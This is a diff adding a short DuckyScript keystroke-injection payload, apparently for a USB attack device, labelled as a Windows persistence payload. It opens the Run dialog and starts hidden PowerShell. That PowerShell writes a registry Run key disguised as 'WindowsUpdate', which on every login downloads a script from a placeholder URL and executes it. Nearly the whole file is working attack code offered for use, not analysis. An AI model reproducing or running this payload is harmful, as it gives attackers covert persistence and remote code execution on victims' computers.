@@ -1,0 +1,13 @@
+REM Author: UNC0V3R3D
+REM Description: Adds a registry Run key for persistence. The payload runs every time the user logs in.
+REM Version: 1.0
+REM Category: Persistence
+REM Target: Windows 10/11
+REM Requirements: User-level privileges (no admin needed for HKCU)
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value 'powershell -windowstyle hidden -c (New-Object Net.WebClient).DownloadString(\"PAYLOAD_URL\") | IEX' -Force"
+ENTER
+DELAY 2000
+REM End of payload
